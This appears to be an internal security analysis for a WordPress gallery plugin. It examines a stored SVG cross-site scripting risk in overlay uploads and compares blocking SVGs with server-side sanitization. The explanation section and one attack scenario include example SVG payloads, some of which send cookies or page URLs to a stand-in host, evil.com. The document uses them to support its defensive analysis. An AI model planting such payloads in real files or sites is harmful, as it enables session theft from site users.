# SVG Upload Handling — In-Depth Analysis

**Date:** March 4, 2026  
**Reference:** Action item A-3 from [PRODUCTION_READINESS_ACTION_ITEMS.md](PRODUCTION_READINESS_ACTION_ITEMS.md)  
**Severity:** HIGH  
**Purpose:** Provide detailed analysis of the SVG XSS vulnerability and pros/cons for each remediation option.

---

## Table of Contents

- [1. The Vulnerability Explained](#1-the-vulnerability-explained)
- [2. How the Current System Works](#2-how-the-current-system-works)
- [3. Attack Scenarios](#3-attack-scenarios)
- [4. Option 1 — Block SVGs for Overlays](#4-option-1--block-svgs-for-overlays)
- [5. Option 2 — Server-Side SVG Sanitization](#5-option-2--server-side-svg-sanitization)
- [6. Comparison Matrix](#6-comparison-matrix)
- [7. Recommendation](#7-recommendation)

---

## 1. The Vulnerability Explained

### What is SVG XSS?

SVG (Scalable Vector Graphics) files are XML documents that browsers parse and execute. Unlike raster images (PNG, JPEG, WebP), SVGs can contain:

- **`<script>` tags** — Full JavaScript execution:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg">
    <script>document.location='https://evil.com/steal?c='+document.cookie</script>
  </svg>
  ```

- **Event handler attributes** — Execute JavaScript on interaction or load:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
    <rect width="100" height="100" fill="red"/>
  </svg>
  ```

- **`<foreignObject>` elements** — Embed arbitrary HTML:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg">
    <foreignObject width="100%" height="100%">
      <body xmlns="http://www.w3.org/1999/xhtml">
        <script>alert('XSS')</script>
      </body>
    </foreignObject>
  </svg>
  ```

- **`javascript:` URIs** — In `xlink:href`, `href`, or `use` attributes:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <a xlink:href="javascript:alert('XSS')">
      <text y="20">Click me</text>
    </a>
  </svg>
  ```

- **CSS-based attacks** — Data exfiltration via `url()`:
  ```xml
  <svg xmlns="http://www.w3.org/2000/svg">
    <style>
      rect { fill: url('https://evil.com/track?page=' + encodeURIComponent(location.href)); }
    </style>
    <rect width="100" height="100"/>
  </svg>
  ```

### When SVG XSS executes

The XSS payload in an SVG will execute when:

| Rendering method | XSS executes? | Why |
|-----------------|---------------|-----|
| `<img src="overlay.svg">` | **No** | Browsers sandbox SVGs in `<img>` tags — no script execution, no external resource loading |
| `<object data="overlay.svg">` | **Yes** | Full SVG document context with script execution |
| `<iframe src="overlay.svg">` | **Yes** | Full document context (same-origin) |
| `<embed src="overlay.svg">` | **Yes** | Full execution context |
| Inline `<svg>` in HTML | **Yes** | Part of the host document — full DOM access |
| CSS `background-image: url(overlay.svg)` | **No** | Treated as image context — no script execution |
| Direct browser navigation to `overlay.svg` | **Yes** | Browser renders as a full SVG document |

### How WP Super Gallery uses overlays

Overlays are rendered in the gallery frontend as part of the layout template system. Looking at the rendering path:

1. Overlay URLs are stored in the `wpsg_overlay_library` option
2. They are referenced in layout template slot/layer definitions
3. On the frontend, they are rendered inside the Shadow DOM

**Critical question:** How are overlays rendered in the DOM?

- If rendered as `<img src="...">` — XSS does not execute (browser sandbox)
- If rendered as inline `<svg>` — XSS executes with access to the host page
- If a user navigates directly to the overlay URL — XSS executes

Even if the frontend only uses `<img>` tags, the **stored SVG file is accessible via its direct URL** on the WordPress uploads directory. An attacker could craft a link to `https://yoursite.com/wp-content/uploads/wpsg-overlays/malicious.svg` and trick an admin into visiting it. The SVG would execute in the origin context of the WordPress site.

---

## 2. How the Current System Works

From `class-wpsg-overlay-library.php`:

```php
$allowed_types = [
    'image/png',
    'image/svg+xml',  // ← SVGs allowed
    'image/webp',
    'image/gif',
    'image/jpeg',
    // ...
];
```

The upload flow:
1. Admin uploads a file via the overlay library REST endpoint
2. `handle_upload()` checks MIME type against the allowlist
3. `wp_handle_upload()` validates the file and moves it to `wp-content/uploads/wpsg-overlays/`
4. The file is stored and served as a static asset

**No SVG sanitization is performed.** `wp_handle_upload()` validates that the file matches the declared MIME type but does **not** inspect or sanitize SVG content.

The code includes a comment acknowledging this:
> *"SVG: allowed for admin-only overlay uploads. SVGs are passed through `wp_handle_upload()` which validates against the MIME allowlist, but does not strip inline scripts. Restrict callers to admin capability checks (enforced in the REST endpoint) to mitigate XSS risk."*

The "admin-only" restriction provides limited protection — it prevents anonymous users from uploading malicious SVGs, but:
- A compromised admin account can upload malicious SVGs
- An admin could unknowingly upload a malicious SVG (e.g., downloaded from a third-party asset site)
- The uploaded SVG remains dangerous regardless of who uploaded it

---

## 3. Attack Scenarios

### Scenario A: Compromised admin account uploads malicious SVG

1. Attacker compromises an admin account (phishing, password reuse, etc.)
2. Uploads an SVG overlay containing `<script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
3. Any user who navigates to the SVG URL has their cookies stolen
4. If the SVG is used in a gallery visible to other admins, the XSS may execute in their context (depending on rendering method)

### Scenario B: Social engineering

1. Attacker sends an admin a "design asset" SVG file that contains embedded JavaScript
2. Admin uploads it through the overlay library (SVGs are expected here)
3. SVG sits in uploads directory, publicly accessible

### Scenario C: Direct URL access

1. Even if SVGs are rendered as `<img>` in the gallery, the file is at a predictable URL pattern: `https://site.com/wp-content/uploads/wpsg-overlays/{uuid}.svg`
2. Attacker crafts a link and distributes it (email, chat, comment link)
3. Victim clicks → SVG renders in browser → XSS executes in the WordPress origin

---

## 4. Option 1 — Block SVGs for Overlays

### How it works

Remove `image/svg+xml` from the allowed MIME list in `handle_upload()`. Reject SVG uploads with a clear, user-friendly error message.

### Changes required

| File | Change |
|------|--------|
| `class-wpsg-overlay-library.php` ~L103–113 | Remove `'image/svg+xml'` from `$allowed_types`, remove `'svg' => 'image/svg+xml'` from `$allowed_mimes` |
| REST endpoint (overlay upload) | Return error message: "SVG files are not supported for overlays due to security concerns. Please use PNG, WebP, or another raster format." |

### Implementation sketch

```php
$allowed_types = [
    'image/png',
    // 'image/svg+xml',  ← REMOVED
    'image/webp',
    'image/gif',
    'image/jpeg',
    'image/jpg',
    'image/avif',
    'image/tiff',
];

$allowed_mimes = [
    'png'  => 'image/png',
    // 'svg'  => 'image/svg+xml',  ← REMOVED
    'webp' => 'image/webp',
    'gif'  => 'image/gif',
    'jpg'  => 'image/jpeg',
    'jpeg' => 'image/jpeg',
    'avif' => 'image/avif',
    'tif'  => 'image/tiff',
    'tiff' => 'image/tiff',
];
```

### Pros

| Advantage | Detail |
|-----------|--------|
| **Eliminates the attack surface entirely** | No SVGs in uploads = no SVG XSS possible |
| **Trivial implementation** | Remove 2 lines from an array — 5-minute change |
| **Zero maintenance** | No sanitizer to keep updated, no edge cases to handle |
| **No dependencies** | No new composer packages |
| **No false sense of security** | Sanitizers can be bypassed; blocking is absolute |

### Cons

| Disadvantage | Detail | Mitigation |
|--------------|--------|------------|
| **Loses SVG overlay support** | Admins who want scalable, resolution-independent overlays can no longer upload SVGs | They can convert SVGs to high-resolution PNGs (e.g., 2× or 3× resolution for retina screens) using any free tool |
| **Existing SVG overlays become inaccessible?** | No — existing overlays remain in the library and filesystem. The change only blocks new uploads. However, you should consider a migration that flags/removes existing SVG overlays. | Add a WP-CLI command `wp wpsg overlays audit-svg` that lists SVGs in the library; add an admin notice if SVGs exist |
| **SVGs are genuinely useful for overlays** | Vector graphics scale perfectly, have smaller file sizes for graphic elements (borders, frames, badges), and support transparency | The file-size advantage is minimal for typical overlay use cases (photo frames, watermarks). PNG/WebP with transparency covers 95% of overlay needs. |
| **Design professionals expect SVG support** | Agencies and designers commonly work with SVG assets | Acknowledge the limitation in documentation; present it as a security-first decision |

### Effort estimate

**Trivial (30 minutes)**

---

## 5. Option 2 — Server-Side SVG Sanitization

### How it works

Install the `enshrined/svg-sanitize` library (the most widely used PHP SVG sanitizer, used by WordPress.com and many WP plugins). Run every uploaded SVG through the sanitizer before saving to disk.

### Changes required

| File | Change |
|------|--------|
| `composer.json` | Add `"enshrined/svg-sanitize": "^0.20"` to `require` |
| `class-wpsg-overlay-library.php` `handle_upload()` | After MIME validation, read the SVG content, sanitize it, and write the sanitized version |
| Optionally: content headers | Serve SVGs with `Content-Type: image/svg+xml` and `Content-Disposition: inline` to hint browsers to render as image |

### Implementation sketch

```php
use enshrined\svgSanitize\Sanitizer;

public static function handle_upload(array $file) {
    // ... existing MIME validation ...

    // If SVG, sanitize before saving
    if ($file['type'] === 'image/svg+xml' || pathinfo($file['name'], PATHINFO_EXTENSION) === 'svg') {
        $svg_content = file_get_contents($file['tmp_name']);
        if ($svg_content === false) {
            return new WP_Error('wpsg_svg_read', 'Could not read SVG file.');
        }

        $sanitizer = new Sanitizer();
        // Remove all scripts, event handlers, foreign objects, xlink:href with javascript:
        $sanitizer->removeRemoteReferences(true);
        $sanitizer->minify(true);

        $clean_svg = $sanitizer->sanitize($svg_content);
        if (empty($clean_svg)) {
            return new WP_Error('wpsg_svg_invalid', 'SVG file was rejected — it contains disallowed content. Remove scripts, event handlers, and external references, then try again.');
        }

        // Write sanitized content back to temp file
        file_put_contents($file['tmp_name'], $clean_svg);
    }

    // Continue with wp_handle_upload() ...
}
```

### What `enshrined/svg-sanitize` removes

| Dangerous element/attribute | Handled? |
|----|----------|
| `<script>` tags | ✅ Removed |
| `onload`, `onclick`, `onerror`, etc. event handlers | ✅ Removed |
| `<foreignObject>` | ✅ Removed |
| `javascript:` URIs | ✅ Removed |
| `data:` URIs (in certain contexts) | ✅ Configurable |
| Remote references (`xlink:href` to external URLs) | ✅ Removed (with `removeRemoteReferences(true)`) |
| CSS `url()` in `<style>` blocks | ⚠️ Partially — removes known dangerous patterns but CSS-based exfiltration is an evolving area |
| XML entity attacks (billion laughs, external entities) | ✅ PHP's `libxml` disables external entities by default |
| Polyglot SVG/HTML files | ⚠️ The sanitizer processes the SVG as XML; polyglot attacks that exploit browser HTML parsing may slip through |

### Pros

| Advantage | Detail |
|-----------|--------|
| **Preserves SVG support** | Admins can continue uploading and using SVG overlays |
| **Industry-standard library** | `enshrined/svg-sanitize` is used by WordPress.com VIP, WooCommerce, and other major WP plugins |
| **Transparent to users** | Upload works as before; dangerous content is silently stripped |
| **Defence in depth** | Even if SVG is accessed directly, the dangerous content has been removed at write time |
| **Smaller file sizes** | SVG overlays (borders, frames, badges) are typically 1–10 KB vs 50–200 KB for equivalent PNGs |

### Cons

| Disadvantage | Detail | Mitigation |
|--------------|--------|------------|
| **Sanitizers are bypassable** | SVG sanitization is an arms race. New bypass techniques are discovered regularly. The `enshrined/svg-sanitize` library has had its own CVEs (e.g., [CVE-2023-44402](https://nvd.nist.gov/vuln/detail/CVE-2023-44402)). | Keep the dependency updated; layer with CSP headers (P20-H H-7); render SVGs as `<img>` in the frontend |
| **New dependency** | Adds a composer package that must be maintained and updated | The package is actively maintained ( >3K GitHub stars, regular releases) |
| **False sense of security** | "SVGs are sanitized" may lead developers/users to assume they're 100% safe, reducing vigilance | Document clearly that sanitization is a mitigation layer, not a guarantee; layer with CSP and `<img>` rendering |
| **May break legitimate SVGs** | Aggressive sanitization can remove elements that are safe but look suspicious (e.g., inline CSS with `@import`, `<use>` elements referencing internal defs) | Provide clear error messages when SVGs are rejected; document supported SVG features |
| **Doesn't protect existing uploads** | SVGs uploaded before the sanitizer was added are still unsanitized | Run a one-time migration that re-processes existing SVGs through the sanitizer |
| **CSS-based exfiltration is hard to fully prevent** | Advanced CSS injection (using `background-image: url(...)` with data encoded in the URL) is difficult to catch without removing all `<style>` blocks | Consider stripping all `<style>` blocks from overlays in addition to standard sanitization |
| **Additional effort for edge cases** | Some SVGs from design tools (Illustrator, Figma) include metadata, embedded fonts, filters, and gradients that may be flagged | Test with common design tool exports; document known-compatible SVG features |

### Effort estimate

**Small–Medium (2–4 hours)**
- Install and configure `enshrined/svg-sanitize`
- Add sanitization to upload path
- Test with a corpus of SVGs (clean + malicious)
- Backfill existing SVGs
- Add PHPUnit tests

---

## 6. Comparison Matrix

| Criterion | Option 1 (Block SVGs) | Option 2 (Sanitize SVGs) |
|-----------|----------------------|--------------------------|
| **XSS prevention** | ✅ Eliminated — no SVGs accepted | ⚠️ Mitigated — depends on sanitizer coverage |
| **Defence permanence** | ✅ Absolute — no arms race | ⚠️ Requires ongoing updates as new bypasses emerge |
| **SVG overlay support** | ❌ Lost — PNG/WebP alternatives required | ✅ Preserved |
| **Implementation effort** | ✅ Trivial (30 minutes) | ⚠️ Small–Medium (2–4 hours) |
| **Maintenance burden** | ✅ Zero | ⚠️ Dependency updates + bypass monitoring |
| **New dependencies** | ✅ None | ⚠️ `enshrined/svg-sanitize` |
| **Impact on existing workflows** | ⚠️ Admins must convert SVGs to raster formats | ✅ Transparent |
| **Risk of future bypass** | ✅ None — SVGs are never stored | ⚠️ Real — sanitizer CVEs have occurred |
| **Compatibility with design tools** | N/A | ⚠️ Some tool exports may be over-sanitized |
| **Layered security value** | Strongest layer (prevention) | Good layer (mitigation); should be combined with `<img>` rendering + CSP |

---

## 7. Recommendation

**Both options are defensible.** The choice depends on how important SVG overlay support is to your users:

### Choose Option 1 (Block SVGs) if:
- SVG overlays are a rarely-used feature
- Your users primarily work with photo frames, watermarks, and badges (all of which work well as PNG/WebP)
- You prefer the simplest, most robust security posture
- You want zero ongoing maintenance for this attack surface

### Choose Option 2 (Sanitize SVGs) if:
- SVG overlays are actively used by your user base (e.g., design agencies creating custom vector borders/frames)
- File size efficiency matters (SVGs can be 10–20× smaller than equivalent PNGs)
- You're willing to maintain the sanitizer dependency and monitor for bypasses
- You plan to layer it with additional defenses (CSP headers from P20-H H-7, `<img>` tag rendering, periodic re-sanitization)

### If you choose Option 2, also do these:

1. **Ensure frontend renders SVG overlays as `<img src="...">`** — not inline `<svg>`, `<object>`, or `<embed>`. Browser sandbox on `<img>` prevents script execution even if a bypass slips through the sanitizer.
2. **Add CSP headers** (covered in P20-H H-7) — `script-src 'self'` blocks inline scripts even if an SVG is accessed directly.
3. **Serve SVGs with `Content-Security-Policy: script-src 'none'`** as a response header from the uploads directory (via `.htaccess` or nginx config).
4. **Run a quarterly audit** — Re-process all stored SVGs through the latest sanitizer version.

These layered defenses significantly reduce the residual risk of Option 2.

---

*Decision: **Option 2 (sanitize and allow)** selected on March 5, 2026 with enhancements: dual-layer sanitization (`enshrined/svg-sanitize` server-side + DOMPurify client-side), custom CSS sanitizer for `<style>` blocks, URI allowlisting, `@font-face` with embedded data: fonts only. Implemented as Track P20-L in [PHASE20_REPORT.md](PHASE20_REPORT.md).*
